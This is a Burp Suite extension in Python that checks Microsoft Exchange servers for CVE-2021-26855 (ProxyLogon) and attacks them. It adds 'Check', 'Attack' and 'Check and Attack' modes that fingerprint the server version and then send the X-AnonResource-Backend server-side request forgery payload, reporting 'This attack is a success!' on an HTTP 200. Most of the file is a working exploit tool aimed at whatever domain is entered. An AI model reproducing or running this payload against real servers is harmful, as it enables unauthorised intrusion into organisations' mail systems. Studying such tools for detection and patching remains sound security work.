#!-*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IContextMenuFactory
from burp import ITab
from burp import IExtensionStateListener
from javax import swing
from java.awt import Font, Color
import re
import requests
import sys
import threading
import time
import sys
from requests.exceptions import ConnectionError



sysEncodingType = sys.getfilesystemencoding()

class BurpExtender(IBurpExtender, IContextMenuFactory, ITab, IExtensionStateListener):
    TEXTAREA_WIDTH = 650
    TEXTAREA_HEIGHT = 150
    LABEL_WIDTH = 100
    LABEL_HEIGHT = 25

    def registerExtenderCallbacks(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._jDecoderPanel = swing.JPanel()
        self._jDecoderPanel.setLayout(None)

        # Combobox Values
        self._decodeType = ['Check',
                            'Attack',
                            'Check and Attack']

        self._decodeTypeFunc = [self.check,
                                self.attack,
                                self.checkandattack]

        # GUI components
        self._jLabelInput = swing.JLabel()
        self._jLabelOutput = swing.JLabel()
        self._jLabelExample = swing.JLabel()
        self._jLabelOputFormat = swing.JLabel()
        self._jTextAreaInputData = swing.JTextArea()
        self._jTextAreaOutputData = swing.JTextArea()
        self._jScrollPaneIntput = swing.JScrollPane(self._jTextAreaInputData)
        self._jScrollPaneOutput = swing.JScrollPane(self._jTextAreaOutputData)

        self._jButtonDecoder = swing.JButton('Execute', actionPerformed=self.decode)
        self._jComboDecodeType = swing.JComboBox(self._decodeType, actionListener=self.change_decode)

        # Configure GUI
        self._jLabelInput.setText('Input:')
        self._jLabelOutput.setText('Output:')
        self._jLabelExample.setText('Example: ')
        self._jLabelExample.setFont(Font("Consolas", Font.PLAIN, 14))

        self._jDecoderPanel.add(self._jLabelInput)
        self._jDecoderPanel.add(self._jLabelOutput)

        self._jScrollPaneIntput.setVerticalScrollBarPolicy(swing.JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        self._jScrollPaneOutput.setVerticalScrollBarPolicy(swing.JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        self._jLabelExample.setText(self._decodeTypeFunc[0]())


        # Configure locations
        self._jLabelInput.setBounds(20, 15, self.LABEL_WIDTH, self.LABEL_HEIGHT)
        self._jLabelOutput.setBounds(20, 225, self.LABEL_WIDTH, self.LABEL_HEIGHT)
        self._jLabelExample.setBounds(20, 190, self.TEXTAREA_WIDTH, 30)
        self._jLabelOputFormat.setBounds(self.TEXTAREA_WIDTH + 80, 117, 150, 30)
        self._jScrollPaneIntput.setBounds(20 ,40, self.TEXTAREA_WIDTH, self.TEXTAREA_HEIGHT)
        self._jScrollPaneOutput.setBounds(20, 250, self.TEXTAREA_WIDTH, self.TEXTAREA_HEIGHT)
        self._jButtonDecoder.setBounds(self.TEXTAREA_WIDTH + 50, 40, 150, 30)
        self._jComboDecodeType.setBounds(self.TEXTAREA_WIDTH + 50, 80, 150,30)
 
        self._jDecoderPanel.add(self._jLabelInput)
        self._jDecoderPanel.add(self._jLabelOutput)
        self._jDecoderPanel.add(self._jLabelExample)
        self._jDecoderPanel.add(self._jLabelOputFormat)
        self._jDecoderPanel.add(self._jComboDecodeType)
        self._jDecoderPanel.add(self._jScrollPaneIntput)
        self._jDecoderPanel.add(self._jScrollPaneOutput)
        self._jDecoderPanel.add(self._jButtonDecoder)

        # Setup Tabs
        self._jConfigTab = swing.JTabbedPane()
        self._jConfigTab.addTab("Decoder", self._jDecoderPanel)
        callbacks.customizeUiComponent(self._jConfigTab)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)

        return
    

    def change_decode(self, button):
        decodeType = self._jComboDecodeType.getSelectedIndex()
        data = self._decodeTypeFunc[decodeType]()
        self._jLabelExample.setText(data)


    def decode(self, button):
        decodeType = self._jComboDecodeType.getSelectedIndex()
        data = self._decodeTypeFunc[decodeType](self._jTextAreaInputData.getText())
        self._jTextAreaOutputData.setText(data)

    def getTabCaption(self):
        return 'MyDecoder'

    def getUiComponent(self):
        return self._jConfigTab


    def createMenuItems(self, invocation):
        menu = []

        # Message Viewer will show menu item if selected by the user
        ctx = invocation.getInvocationContext()
        start = invocation.getSelectionBounds()[0];
        end = invocation.getSelectionBounds()[1];
        messages = invocation.getSelectedMessages();
        if end > start:
            if (ctx == invocation.CONTEXT_MESSAGE_EDITOR_REQUEST or
                ctx == invocation.CONTEXT_MESSAGE_VIEWER_REQUEST):
                if end > start:
                    selected_content = self._helpers.bytesToString(messages[0].getRequest()[start: end])

            if (ctx == invocation.CONTEXT_MESSAGE_EDITOR_RESPONSE or
                ctx == invocation.CONTEXT_MESSAGE_VIEWER_RESPONSE):
                selected_content = self._helpers.bytesToString(messages[0].getResponse())[start: end]

            menu.append(swing.JMenuItem("Send to MyDecoder", None, actionPerformed=lambda x, msg=selected_content: self.sendToMyDecoder(msg)))
        return menu if menu else None

    def sendToMyDecoder(self, msg):
        self._jTextAreaInputData.setText(msg)
        parentTab = self._jConfigTab.getParent()
        thread1 = self.HighlightParentTab(parentTab, self._jConfigTab)
        thread1.start()


    class HighlightParentTab(threading.Thread):
        def __init__(self, parentTab, childComponent):
            threading.Thread.__init__(self)
            self.parentTab = parentTab
            self.childComponent = childComponent

        def run(self):
            for i in range(self.parentTab.getTabCount()):
                if self.parentTab.getComponentAt(i).equals(self.childComponent):
                    self.parentTab.setBackgroundAt(i, Color(0xE58900))
                    time.sleep(3)
                    self.parentTab.setBackgroundAt(i, Color.BLACK)

    def check(self, data=None):
        domain = data
        if domain is None:
            return r'Enter Domain'
        # check if the target matches as exchange server and as one of the versions that is vulnerable to CVE-2021-26855
        try:
            thelist = requests.get('https://' + domain + '/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application')  
        except ConnectionError:
            return r'Timeout for checking, wrong doamin!'
        else:
            cves = re.findall('[0-9][0-9].[0-9].[0-9][0-9][0-9][0-9].[0-9][0-9]', thelist.text)
            if any("15.1.2507.17" in s for s in cves):
                return r'It is the right product that contains CVE-2021-26855!'
            return r'Not the right product!'

    def attack(self, data=None):
        domain = data
        if domain is None:
            return r'Enter Domain'
        vulnheader = {"X-AnonResource": "true", "X-AnonResource-Backend": 'https://' + domain + '/ecp/default.flt?~3;'}  
        try:
            target = requests.get('https://' + domain + '/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application', cookies=vulnheader)
        except ConnectionError:
            return r'Timeout for attacking, wrong domain!'
        else:
            if target.status_code == 200:
                return r'HTTP interaction confirmed. This attack is a success!'
            else:
                return r'Response other than 200, Not the right doamin!'


    def checkandattack(self, data=None):
        domain = data
        if domain is None:
            return r'Enter Domain'
        # check if the target matches as exchange server and as one of the versions that is vulnerable to CVE-2021-26855
        try:
            thelist = requests.get('https://' + domain + '/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application')  
        except ConnectionError:
            return r'Timeout for checking and attacking, wrong domain!'
        else:
            cves = re.findall('[0-9][0-9].[0-9].[0-9][0-9][0-9][0-9].[0-9][0-9]', thelist.text)
            if  any("15.1.2507.17" in s for s in cves):
                vulnheader = {"X-AnonResource": "true", "X-AnonResource-Backend": 'https://' + domain + '/ecp/default.flt?~3;'}  
                target = requests.get('https://' + domain + '/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application', cookies=vulnheader)  
                if target.status_code == 200:
                    return r'The target contains CVE-2021-26855 and with HTTP interaction confirmed. This attack is a success!'
                return r'Response other than 200. Failed!'
            else:
                return r'Response other than 200, Not the right doamin!'
        
